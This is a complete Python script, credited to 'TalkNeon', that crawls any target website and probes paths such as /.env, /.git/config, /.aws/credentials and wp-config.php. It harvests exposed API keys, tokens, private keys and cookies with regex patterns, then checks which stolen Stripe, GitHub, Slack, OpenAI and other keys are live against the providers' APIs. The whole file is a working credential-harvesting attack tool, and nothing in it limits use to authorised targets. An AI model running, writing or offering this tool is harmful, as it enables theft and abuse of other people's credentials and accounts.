# ============================================================
#  API Key Scraper + Validator
#  By TalkNeon
#
#  Crawls a site (or single URL) and rips every API key, token,
#  secret, JWT, AWS cred, Stripe pk/sk, Google key, Mapbox,
#  Sendgrid, Slack, GitHub, Twilio, Mailgun, etc. from:
#    - HTML
#    - inline + external JS
#    - JSON / config endpoints
#    - source maps (.map)
#    - HTML comments
#    - response headers
#    - common config paths (.env, config.json, etc.)
#
#  Then live-checks the ones we have validators for.
#
#  Usage:
#    python api_scraper.py https://target.com
#    python api_scraper.py https://target.com --depth 2 --threads 20
#    python api_scraper.py --file urls.txt
# ============================================================

import re
import sys
import json
import time
import argparse
import threading
import urllib.parse as up
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
HEADERS = {"User-Agent": UA, "Accept": "*/*"}
TIMEOUT = 15

# ============================================================
#  Regex patterns — tuned to catch the obvious + the sneaky
# ============================================================
PATTERNS = {
    "stripe_pk_live":   r"pk_live_[0-9A-Za-z]{20,}",
    "stripe_pk_test":   r"pk_test_[0-9A-Za-z]{20,}",
    "stripe_sk_live":   r"sk_live_[0-9A-Za-z]{20,}",
    "stripe_sk_test":   r"sk_test_[0-9A-Za-z]{20,}",
    "stripe_rk":        r"rk_(?:live|test)_[0-9A-Za-z]{20,}",
    "stripe_client_secret": r"(?:pi|seti|src|cs)_[0-9A-Za-z]{14,}_secret_[0-9A-Za-z]{16,}",

    "aws_access_key":   r"(?<![A-Z0-9])(?:AKIA|ASIA|AIDA|AGPA|ANPA|ANVA|AROA|AIPA)[A-Z0-9]{16}(?![A-Z0-9])",
    "aws_secret":       r"(?<![A-Za-z0-9/+=])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])",  # noisy; gated by context

    "google_api":       r"AIza[0-9A-Za-z\-_]{35}",
    "google_oauth":     r"ya29\.[0-9A-Za-z\-_]+",
    "firebase":         r"AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140,170}",

    "mapbox":           r"pk\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+",
    "github_pat":       r"gh[pousr]_[A-Za-z0-9]{36,251}",
    "github_oauth":     r"gho_[A-Za-z0-9]{36}",

    "slack_token":      r"xox[abprs]-[0-9A-Za-z\-]{10,48}",
    "slack_webhook":    r"https://hooks\.slack\.com/services/T[0-9A-Z]+/B[0-9A-Z]+/[A-Za-z0-9]+",
    "discord_webhook":  r"https://(?:discord|discordapp)\.com/api/webhooks/\d+/[A-Za-z0-9_\-]+",
    "discord_token":    r"(?:[MN][A-Za-z\d]{23,25}|mfa\.[A-Za-z\d_-]{84})\.[A-Za-z\d_-]{6}\.[A-Za-z\d_-]{27,38}",

    "sendgrid":         r"SG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}",
    "mailgun":          r"key-[0-9a-zA-Z]{32}",
    "mailchimp":        r"[0-9a-f]{32}-us[0-9]{1,2}",
    "postmark":         r"(?i)postmark[^a-z0-9]{0,5}([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})",

    "twilio_sid":       r"AC[a-f0-9]{32}",
    "twilio_token":     r"SK[a-f0-9]{32}",

    "openai":           r"sk-(?:proj-)?[A-Za-z0-9_\-]{20,}T3BlbkFJ[A-Za-z0-9_\-]{20,}",
    "anthropic":        r"sk-ant-[A-Za-z0-9_\-]{80,}",
    "huggingface":      r"hf_[A-Za-z0-9]{34,}",

    "jwt":              r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}",
    "supabase_anon":    r"eyJ[A-Za-z0-9_-]{20,}\.eyJ[A-Za-z0-9_-]{60,}\.[A-Za-z0-9_-]{20,}",  # JWT shape

    "private_key":      r"-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY-----",
    "ssh_pub":          r"ssh-(?:rsa|ed25519|dss) [A-Za-z0-9+/=]{60,}",

    "basic_auth_url":   r"https?://[A-Za-z0-9._%+-]+:[^@\s'\"<>]{4,}@[A-Za-z0-9.\-]+",

    "bearer_inline":    r"(?i)bearer\s+([A-Za-z0-9_\-\.=]{20,})",
    "authorization_hdr":r"(?i)authorization['\"]?\s*[:=]\s*['\"]?([A-Za-z0-9_\-\.=:\s]{15,200})['\"]",

    "generic_secret":   r"(?i)(?:api[_-]?key|apikey|access[_-]?token|secret[_-]?key|client[_-]?secret|auth[_-]?token)['\"]?\s*[:=]\s*['\"]([A-Za-z0-9_\-\.=]{16,})['\"]",
}

# Things to strip out — false-positive trash
JUNK = {
    "0000000000000000000000000000000000000000",
    "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
    "your-api-key", "your_api_key", "YOUR_API_KEY", "REPLACE_ME",
}

# Common config paths to probe on every host
CONFIG_PATHS = [
    "/.env", "/.env.local", "/.env.production", "/.env.dev",
    "/config.json", "/config.js", "/app.config.js", "/env.js",
    "/.git/config", "/.gitignore", "/.npmrc", "/.dockerenv",
    "/firebase.json", "/manifest.json", "/composer.json", "/package.json",
    "/.aws/credentials", "/.aws/config",
    "/wp-config.php", "/wp-config.bak", "/configuration.php",
    "/swagger.json", "/swagger.yaml", "/openapi.json", "/api-docs",
    "/robots.txt", "/sitemap.xml", "/security.txt", "/.well-known/security.txt",
    "/server-status", "/phpinfo.php", "/info.php",
    "/debug", "/actuator/env", "/actuator/health",
]

# ============================================================
#  Storage
# ============================================================
class Findings:
    def __init__(self):
        self.lock = threading.Lock()
        # kind -> set of (value, source_url)
        self.hits = defaultdict(set)
        self.visited = set()
        self.queue_seen = set()

    def add(self, kind, value, source):
        v = value.strip()
        if not v or v in JUNK:
            return
        if len(v) < 10:
            return
        with self.lock:
            self.hits[kind].add((v, source))

    def all_keys(self):
        with self.lock:
            out = []
            for kind, items in self.hits.items():
                for val, src in items:
                    out.append({"type": kind, "value": val, "source": src})
            return out

# ============================================================
#  Network helpers
# ============================================================
def fetch(url, session=None):
    s = session or requests
    try:
        r = s.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False, allow_redirects=True)
        return r
    except Exception:
        return None

def same_host(a, b):
    try:
        return up.urlparse(a).netloc.split(":")[0] == up.urlparse(b).netloc.split(":")[0]
    except Exception:
        return False

# ============================================================
#  Extraction
# ============================================================
JS_LINK_RE = re.compile(r"""<script[^>]+src=["']([^"']+)["']""", re.I)
HREF_RE    = re.compile(r"""(?:href|src)=["']([^"']+)["']""", re.I)
COMMENT_RE = re.compile(r"<!--(.*?)-->", re.S)
SOURCEMAP_RE = re.compile(r"//[#@]\s*sourceMappingURL=([^\s'\"]+)")

def absolutize(base, link):
    try:
        return up.urljoin(base, link)
    except Exception:
        return None

def harvest(text, source, findings):
    if not text:
        return
    for kind, pat in PATTERNS.items():
        try:
            for m in re.finditer(pat, text):
                val = m.group(1) if m.groups() else m.group(0)
                # AWS secret is too noisy — only keep if context word nearby
                if kind == "aws_secret":
                    start = max(0, m.start() - 60)
                    around = text[start:m.end() + 20].lower()
                    if "aws" not in around and "secret" not in around:
                        continue
                findings.add(kind, val, source)
        except Exception:
            continue

def harvest_headers(headers, source, findings):
    try:
        for k, v in headers.items():
            kl = k.lower()
            if kl in ("authorization", "x-api-key", "x-auth-token", "x-access-token", "set-cookie"):
                findings.add(f"header:{kl}", str(v), source)
            harvest(f"{k}: {v}", source, findings)
    except Exception:
        pass

# ============================================================
#  Crawler
# ============================================================
def crawl(start_url, max_depth, max_pages, threads, findings):
    session = requests.Session()
    session.headers.update(HEADERS)

    queue = [(start_url, 0)]
    findings.queue_seen.add(start_url)
    pages_done = 0

    def process(url, depth):
        if url in findings.visited:
            return []
        findings.visited.add(url)
        r = fetch(url, session)
        if r is None:
            return []
        ctype = r.headers.get("content-type", "").lower()
        text = r.text if r.text else ""
        harvest_headers(r.headers, url, findings)
        harvest(text, url, findings)

        # Comments
        for c in COMMENT_RE.findall(text):
            harvest(c, url + " [comment]", findings)

        # Source maps
        for sm in SOURCEMAP_RE.findall(text):
            sm_url = absolutize(url, sm)
            if sm_url and same_host(start_url, sm_url):
                rr = fetch(sm_url, session)
                if rr is not None:
                    harvest(rr.text, sm_url, findings)

        new_links = []
        if "html" in ctype or "<html" in text[:500].lower():
            # JS files
            for js in JS_LINK_RE.findall(text):
                ju = absolutize(url, js)
                if ju and ju not in findings.queue_seen:
                    findings.queue_seen.add(ju)
                    new_links.append((ju, depth))  # JS doesn't increment depth
            # Hyperlinks (same host, depth + 1)
            if depth < max_depth:
                for h in HREF_RE.findall(text):
                    hu = absolutize(url, h)
                    if not hu or hu in findings.queue_seen:
                        continue
                    if not same_host(start_url, hu):
                        continue
                    if any(hu.lower().endswith(ext) for ext in (".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".woff", ".woff2", ".ttf", ".pdf", ".zip", ".mp4", ".mp3")):
                        continue
                    findings.queue_seen.add(hu)
                    new_links.append((hu, depth + 1))
        return new_links

    with ThreadPoolExecutor(max_workers=threads) as pool:
        while queue and pages_done < max_pages:
            batch = queue[:threads * 4]
            queue = queue[threads * 4:]
            futures = {pool.submit(process, u, d): (u, d) for u, d in batch}
            for fut in as_completed(futures):
                pages_done += 1
                try:
                    nxt = fut.result()
                    for item in nxt:
                        if pages_done + len(queue) < max_pages:
                            queue.append(item)
                except Exception:
                    pass
                if pages_done % 10 == 0:
                    print(f"  [+] crawled {pages_done} | queue {len(queue)} | unique findings so far: {sum(len(v) for v in findings.hits.values())}")
                if pages_done >= max_pages:
                    break

def probe_config_paths(start_url, findings, threads):
    base = f"{up.urlparse(start_url).scheme}://{up.urlparse(start_url).netloc}"
    urls = [base + p for p in CONFIG_PATHS]
    session = requests.Session()
    session.headers.update(HEADERS)

    def go(u):
        r = fetch(u, session)
        if r is None or r.status_code >= 400:
            return
        harvest_headers(r.headers, u, findings)
        harvest(r.text, u, findings)

    with ThreadPoolExecutor(max_workers=threads) as pool:
        list(pool.map(go, urls))

# ============================================================
#  Validators (only for ones with safe, read-only check endpoints)
# ============================================================
def v_stripe(key):
    # works for pk and sk
    try:
        r = requests.get("https://api.stripe.com/v1/tokens", auth=(key, ""), timeout=10, verify=False)
        if r.status_code == 401: return "invalid"
        if r.status_code in (200, 400, 402): return "live"
        return f"http {r.status_code}"
    except Exception as e:
        return f"err: {str(e)[:40]}"

def v_google(key):
    try:
        r = requests.get(f"https://maps.googleapis.com/maps/api/geocode/json?address=test&key={key}", timeout=10, verify=False)
        d = r.json()
        if d.get("status") == "REQUEST_DENIED" and "API key" in d.get("error_message", ""):
            return "invalid"
        return f"live ({d.get('status')})"
    except Exception as e:
        return f"err: {str(e)[:40]}"

def v_sendgrid(key):
    try:
        r = requests.get("https://api.sendgrid.com/v3/scopes", headers={"Authorization": f"Bearer {key}"}, timeout=10, verify=False)
        if r.status_code == 401: return "invalid"
        if r.status_code == 200: return "live"
        return f"http {r.status_code}"
    except Exception as e:
        return f"err: {str(e)[:40]}"

def v_mailgun(key):
    try:
        r = requests.get("https://api.mailgun.net/v3/domains", auth=("api", key), timeout=10, verify=False)
        if r.status_code == 401: return "invalid"
        if r.status_code == 200: return "live"
        return f"http {r.status_code}"
    except Exception as e:
        return f"err: {str(e)[:40]}"

def v_github(token):
    try:
        r = requests.get("https://api.github.com/user", headers={"Authorization": f"token {token}"}, timeout=10, verify=False)
        if r.status_code == 401: return "invalid"
        if r.status_code == 200: return f"live ({r.json().get('login')})"
        return f"http {r.status_code}"
    except Exception as e:
        return f"err: {str(e)[:40]}"

def v_slack(token):
    try:
        r = requests.post("https://slack.com/api/auth.test", headers={"Authorization": f"Bearer {token}"}, timeout=10, verify=False)
        d = r.json()
        if d.get("ok"): return f"live ({d.get('team')})"
        return f"invalid ({d.get('error')})"
    except Exception as e:
        return f"err: {str(e)[:40]}"

def v_slack_webhook(url):
    try:
        r = requests.post(url, json={"text": ""}, timeout=10, verify=False)
        if r.status_code == 400 and "no_text" in r.text: return "live"
        if r.status_code == 200: return "live"
        if r.status_code == 404: return "invalid"
        return f"http {r.status_code}"
    except Exception as e:
        return f"err: {str(e)[:40]}"

def v_discord_webhook(url):
    try:
        r = requests.get(url, timeout=10, verify=False)
        if r.status_code == 200: return "live"
        if r.status_code == 404: return "invalid"
        return f"http {r.status_code}"
    except Exception as e:
        return f"err: {str(e)[:40]}"

def v_mapbox(token):
    try:
        r = requests.get(f"https://api.mapbox.com/tokens/v2?access_token={token}", timeout=10, verify=False)
        if r.status_code == 200: return "live"
        if r.status_code == 401: return "invalid"
        return f"http {r.status_code}"
    except Exception as e:
        return f"err: {str(e)[:40]}"

def v_openai(key):
    try:
        r = requests.get("https://api.openai.com/v1/models", headers={"Authorization": f"Bearer {key}"}, timeout=10, verify=False)
        if r.status_code == 401: return "invalid"
        if r.status_code == 200: return "live"
        return f"http {r.status_code}"
    except Exception as e:
        return f"err: {str(e)[:40]}"

def v_huggingface(key):
    try:
        r = requests.get("https://huggingface.co/api/whoami-v2", headers={"Authorization": f"Bearer {key}"}, timeout=10, verify=False)
        if r.status_code == 401: return "invalid"
        if r.status_code == 200: return f"live ({r.json().get('name')})"
        return f"http {r.status_code}"
    except Exception as e:
        return f"err: {str(e)[:40]}"

VALIDATORS = {
    "stripe_pk_live":  v_stripe,
    "stripe_pk_test":  v_stripe,
    "stripe_sk_live":  v_stripe,
    "stripe_sk_test":  v_stripe,
    "stripe_rk":       v_stripe,
    "google_api":      v_google,
    "sendgrid":        v_sendgrid,
    "mailgun":         v_mailgun,
    "github_pat":      v_github,
    "github_oauth":    v_github,
    "slack_token":     v_slack,
    "slack_webhook":   v_slack_webhook,
    "discord_webhook": v_discord_webhook,
    "mapbox":          v_mapbox,
    "openai":          v_openai,
    "huggingface":     v_huggingface,
}

def validate_all(findings, threads):
    jobs = []
    for item in findings.all_keys():
        v = VALIDATORS.get(item["type"])
        if v:
            jobs.append((item, v))
    if not jobs:
        return []
    print(f"\n[*] Validating {len(jobs)} keys...")
    results = []
    with ThreadPoolExecutor(max_workers=threads) as pool:
        futs = {pool.submit(fn, it["value"]): it for it, fn in jobs}
        for fut in as_completed(futs):
            it = futs[fut]
            try:
                status = fut.result()
            except Exception as e:
                status = f"err: {str(e)[:40]}"
            results.append({**it, "status": status})
            tag = "LIVE" if "live" in status.lower() else ("DEAD" if "invalid" in status.lower() else "??")
            print(f"  [{tag}] {it['type']:20s} {it['value'][:35]}...  -> {status}")
    return results

# ============================================================
#  Output
# ============================================================
def save_report(target, findings, validations, out_prefix):
    ts = int(time.time())
    safe = re.sub(r"[^a-z0-9]+", "_", target.lower())[:60].strip("_")
    txt_path = f"{out_prefix}_{safe}_{ts}.txt"
    json_path = f"{out_prefix}_{safe}_{ts}.json"

    grouped = defaultdict(list)
    for it in findings.all_keys():
        grouped[it["type"]].append(it)

    with open(txt_path, "w", encoding="utf-8") as f:
        f.write(f"# API Key Scrape Report\n# target: {target}\n# pages crawled: {len(findings.visited)}\n# total findings: {sum(len(v) for v in grouped.values())}\n\n")
        for kind in sorted(grouped.keys()):
            f.write(f"\n=== {kind}  ({len(grouped[kind])}) ===\n")
            for it in grouped[kind]:
                f.write(f"{it['value']}\n  source: {it['source']}\n")
        if validations:
            f.write("\n\n=== VALIDATION RESULTS ===\n")
            for v in validations:
                f.write(f"[{v['status']}] {v['type']}: {v['value']}\n")

    with open(json_path, "w", encoding="utf-8") as f:
        json.dump({
            "target": target,
            "pages_crawled": len(findings.visited),
            "findings": findings.all_keys(),
            "validations": validations,
        }, f, indent=2)

    print(f"\n[+] Saved {txt_path}")
    print(f"[+] Saved {json_path}")

# ============================================================
#  Main
# ============================================================
def run_one(target, depth, pages, threads, validate, out_prefix):
    print(f"\n{'='*60}\n[*] Target: {target}\n{'='*60}")
    findings = Findings()

    print("[*] Probing common config paths...")
    probe_config_paths(target, findings, threads)

    print(f"[*] Crawling (depth={depth}, max_pages={pages}, threads={threads})...")
    crawl(target, depth, pages, threads, findings)

    total = sum(len(v) for v in findings.hits.values())
    print(f"\n[+] Crawl done. Pages: {len(findings.visited)}. Unique findings: {total}")
    for kind, items in sorted(findings.hits.items()):
        print(f"    {kind:25s} {len(items)}")

    validations = []
    if validate and total > 0:
        validations = validate_all(findings, threads)

    save_report(target, findings, validations, out_prefix)

def main():
    ap = argparse.ArgumentParser(description="Scrape and validate API keys / tokens from a website.")
    ap.add_argument("url", nargs="?", help="Target URL (e.g. https://example.com)")
    ap.add_argument("--file", help="File with one URL per line")
    ap.add_argument("--depth", type=int, default=2, help="Crawl depth (default 2)")
    ap.add_argument("--pages", type=int, default=200, help="Max pages per target (default 200)")
    ap.add_argument("--threads", type=int, default=15, help="Threads (default 15)")
    ap.add_argument("--no-validate", action="store_true", help="Skip live key validation")
    ap.add_argument("--out", default="apikeys_report", help="Output filename prefix")
    args = ap.parse_args()

    targets = []
    if args.url:
        targets.append(args.url.strip())
    if args.file:
        with open(args.file, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    targets.append(line)
    if not targets:
        print("Usage: python api_scraper.py https://example.com  [--depth 2] [--pages 200] [--threads 15]")
        print("   or: python api_scraper.py --file urls.txt")
        sys.exit(1)

    for t in targets:
        if not t.startswith("http"):
            t = "https://" + t
        try:
            run_one(t, args.depth, args.pages, args.threads, not args.no_validate, args.out)
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user.")
            break
        except Exception as e:
            print(f"[!] Error on {t}: {e}")

if __name__ == "__main__":
    main()
